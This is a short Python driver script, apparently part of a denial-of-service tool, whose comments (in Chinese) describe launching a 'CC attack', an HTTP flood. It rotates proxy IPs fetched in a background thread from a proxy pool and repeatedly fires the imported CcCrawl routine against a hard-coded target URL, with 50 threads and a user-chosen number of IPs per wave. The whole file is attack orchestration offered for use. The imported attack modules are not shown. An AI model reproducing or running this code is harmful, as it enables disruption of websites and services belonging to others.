import time
from CcCrawl import *
from ProxySpider import *


# 另起一线程获取ip
def getproxy(ProxySpider):
    while True:
        ProxySpider.run()
        # 休息10s重新获取新的ip
        time.sleep(10)


if __name__ == '__main__':

    CcCrawl = CcCrawl(50, target_url='https://kk.hackerjk.top/')
    ProxySpider = ProxySpider(50, proxypool_url='http://192.168.99.100:5555/random')
    threadtasks = list()

    # 另起一线程获取ip
    t = threading.Thread(target=getproxy, args=[ProxySpider])
    # 线程启动
    t.start()

    # 发起一次CC攻击需要的ip量
    m = int(input("请输入发起一次CC攻击需要的ip量: "))

    print("程序开始执行")

    # 主线程实现cc攻击
    while True:
        # 当重新拿到一定量随机ip后发起攻击
        if len(ProxySpider.ip_list) >= m:
            CcCrawl.run(ProxySpider.ip_list[:m])
            # 清空已用过的ip列表"""
            del ProxySpider.ip_list[:m]

        time.sleep(1)
